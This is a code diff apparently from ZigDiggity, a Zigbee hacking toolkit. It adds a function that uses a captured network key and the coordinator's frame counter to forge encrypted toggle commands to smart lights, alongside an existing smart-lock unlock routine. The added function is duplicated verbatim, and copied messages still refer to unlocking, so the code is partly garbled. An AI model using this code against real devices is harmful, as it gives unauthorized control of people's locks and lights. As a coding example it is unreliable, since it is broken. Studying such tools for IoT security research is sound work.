@@ -1,7 +1,7 @@
 from zigdiggity.packets.nwk_commands import insecure_rejoin, is_rejoin_response
 from zigdiggity.packets.aps import is_transport_key
 from zigdiggity.packets.dot15d4 import data_request, beacon_request, beacon_response, is_beacon_response, is_beacon_request, is_data_request
-from zigdiggity.packets.zcl import encrypted_unlock
+from zigdiggity.packets.zcl import encrypted_unlock, encrypted_toggle
 from zigdiggity.packets.utils import get_extended_source, get_source, extended_pan, extended_address_bytes, get_pan_id, get_frame_counter
 from zigdiggity.misc.timer import Timer
 from zigdiggity.misc.track_watch import TrackWatch
@@ -280,15 +280,163 @@ def unlock_lock(radio, panid, addr, network_key, coord_addr=None, coord_extended
                     break
         return True
 
+def toggle_light(radio, panid, addr, network_key, coord_addr=None, coord_extended_addr=None, frame_counter=None):
+
+    if coord_addr is None:
+        coord_addr = find_coord_addr_by_panid(radio, panid)
+    if coord_extended_addr is None:
+        coord_extended_addr, frame_counter = wait_for_extended_address_also_frame_counter(radio, panid, coord_addr)
+    if frame_counter is None:
+        frame_counter = wait_for_frame_counter(radio, panid, coord_addr)
+    
+    if coord_addr is None or coord_extended_addr is None or frame_counter is None:
+        print_error("Could not find the required data to send the unlock request")
+    
+    frame_counter_iter = SequenceIterator(frame_counter+1, 0xffffffff)
+    sequence_number = random.randint(0,255)
+    nwk_sequence_number = random.randint(0,255)
+    aps_counter = random.randint(0,255)
+    zcl_sequence_number = random.randint(0,255)
+
+    print_info("Attempting to toggle light")
+    timer = Timer(OBSERVATION_TIME)
+    conflict_succeeded=False
+    if conflict_succeeded:
+        print_info("Waiting 4 seconds for the conflict to resolve")
+        timer = Timer(4)
+        while not timer.has_expired():
+            frame = radio.receive_and_ack(panid=panid, addr=coord_addr)
+
+        radio.load_frame(encrypted_toggle(panid, coord_addr, addr, coord_extended_addr, network_key, frame_counter=frame_counter_iter.next(), seq_num=sequence_number, nwk_seq_num=nwk_sequence_number, aps_counter=aps_counter, zcl_seq_num=zcl_sequence_number))
+        data_request_counter = 0
+
+        timer = Timer(1)
+        while not timer.has_expired():
+            frame = radio.receive_and_ack(panid=panid, addr=coord_addr)
+
+        print_info("Waiting for the lock to send a couple data requests")
+        unlock_sent = False
+        timer = Timer(OBSERVATION_TIME)
+        while not timer.has_expired():
+            frame = radio.receive_and_ack(panid=panid, addr=coord_addr)
+            if is_data_request(frame):
+                data_request_counter+=1
+                if data_request_counter == 2:
+                    print_notify("Sending unlock command")
+                    radio.fire_and_retry()
+                    unlock_sent = True
+                    break
+
+        return unlock_sent
+
+    else:
+        print_info("We're going to send a bunch of toggle requests and hope one goes through")
+        for attempts in range(20):
+            radio.load_frame(encrypted_toggle(panid, coord_addr, addr, coord_extended_addr, network_key, frame_counter=frame_counter_iter.next(), seq_num=sequence_number, nwk_seq_num=nwk_sequence_number, aps_counter=aps_counter, zcl_seq_num=zcl_sequence_number))
+            radio.fire_and_retry()
+            radio.receive()
+            timer = Timer(OBSERVATION_TIME)
+            while not timer.has_expired():
+                frame = radio.receive_and_ack(panid=panid, addr=coord_addr)
+            # timer = Timer(OBSERVATION_TIME)
+            # while not timer.has_expired():
+               # # frame = radio.receive_and_ack(panid=panid, addr=coord_addr)
+               # # if is_data_request(frame):
+                # print_notify("Sending unlock command")
+                # sequence_number = random.randint(0,255)
+                # nwk_sequence_number = random.randint(0,255)
+                # aps_counter = random.randint(0,255)
+                # zcl_sequence_number = random.randint(0,255)
+                # radio.load_frame(encrypted_toggle(panid, coord_addr, addr, coord_extended_addr, network_key, frame_counter=frame_counter_iter.next(), seq_num=sequence_number, nwk_seq_num=nwk_sequence_number, aps_counter=aps_counter, zcl_seq_num=zcl_sequence_number))
+
+                # radio.fire_and_retry()
+                # time.sleep(1)
+                # #break
+        return True
+
+def toggle_light(radio, panid, addr, network_key, coord_addr=None, coord_extended_addr=None, frame_counter=None):
+
+    if coord_addr is None:
+        coord_addr = find_coord_addr_by_panid(radio, panid)
+    if coord_extended_addr is None:
+        coord_extended_addr, frame_counter = wait_for_extended_address_also_frame_counter(radio, panid, coord_addr)
+    if frame_counter is None:
+        frame_counter = wait_for_frame_counter(radio, panid, coord_addr)
+    
+    if coord_addr is None or coord_extended_addr is None or frame_counter is None:
+        print_error("Could not find the required data to send the unlock request")
+    
+    frame_counter_iter = SequenceIterator(frame_counter+1, 0xffffffff)
+    sequence_number = random.randint(0,255)
+    nwk_sequence_number = random.randint(0,255)
+    aps_counter = random.randint(0,255)
+    zcl_sequence_number = random.randint(0,255)
+
+    print_info("Attempting to toggle light")
+    timer = Timer(OBSERVATION_TIME)
+    conflict_succeeded=False
+    if conflict_succeeded:
+        print_info("Waiting 4 seconds for the conflict to resolve")
+        timer = Timer(4)
+        while not timer.has_expired():
+            frame = radio.receive_and_ack(panid=panid, addr=coord_addr)
+
+        radio.load_frame(encrypted_toggle(panid, coord_addr, addr, coord_extended_addr, network_key, frame_counter=frame_counter_iter.next(), seq_num=sequence_number, nwk_seq_num=nwk_sequence_number, aps_counter=aps_counter, zcl_seq_num=zcl_sequence_number))
+        data_request_counter = 0
+
+        timer = Timer(1)
+        while not timer.has_expired():
+            frame = radio.receive_and_ack(panid=panid, addr=coord_addr)
+
+        print_info("Waiting for the lock to send a couple data requests")
+        unlock_sent = False
+        timer = Timer(OBSERVATION_TIME)
+        while not timer.has_expired():
+            frame = radio.receive_and_ack(panid=panid, addr=coord_addr)
+            if is_data_request(frame):
+                data_request_counter+=1
+                if data_request_counter == 2:
+                    print_notify("Sending unlock command")
+                    radio.fire_and_retry()
+                    unlock_sent = True
+                    break
+
+        return unlock_sent
+
+    else:
+        print_info("We're going to send a bunch of toggle requests and hope one goes through")
+        for attempts in range(20):
+            radio.load_frame(encrypted_toggle(panid, coord_addr, addr, coord_extended_addr, network_key, frame_counter=frame_counter_iter.next(), seq_num=sequence_number, nwk_seq_num=nwk_sequence_number, aps_counter=aps_counter, zcl_seq_num=zcl_sequence_number))
+            radio.fire_and_retry()
+            radio.receive()
+            timer = Timer(OBSERVATION_TIME)
+            while not timer.has_expired():
+                frame = radio.receive_and_ack(panid=panid, addr=coord_addr)
+            # timer = Timer(OBSERVATION_TIME)
+            # while not timer.has_expired():
+               # # frame = radio.receive_and_ack(panid=panid, addr=coord_addr)
+               # # if is_data_request(frame):
+                # print_notify("Sending unlock command")
+                # sequence_number = random.randint(0,255)
+                # nwk_sequence_number = random.randint(0,255)
+                # aps_counter = random.randint(0,255)
+                # zcl_sequence_number = random.randint(0,255)
+                # radio.load_frame(encrypted_toggle(panid, coord_addr, addr, coord_extended_addr, network_key, frame_counter=frame_counter_iter.next(), seq_num=sequence_number, nwk_seq_num=nwk_sequence_number, aps_counter=aps_counter, zcl_seq_num=zcl_sequence_number))
+
+                # radio.fire_and_retry()
+                # time.sleep(1)
+                # #break
+        return True
+
 def find_locks(radio, panid=None):
 
     result = []
     trackers = dict()
     last_sequence_number = dict()
     if panid is not None:
-        print_notify("Looking at PAN ID 0x%04x for locks" % panid)
+        print_notify("Looking at PAN ID 0x%04x for lights" % panid)
     else:
-        print_notify("Looking for locks on the current channel")
+        print_notify("Looking for lights on the current channel")
     print_info("Monitoring the network for an extended period")
     timer = Timer(17)
     traffic_counter = 0
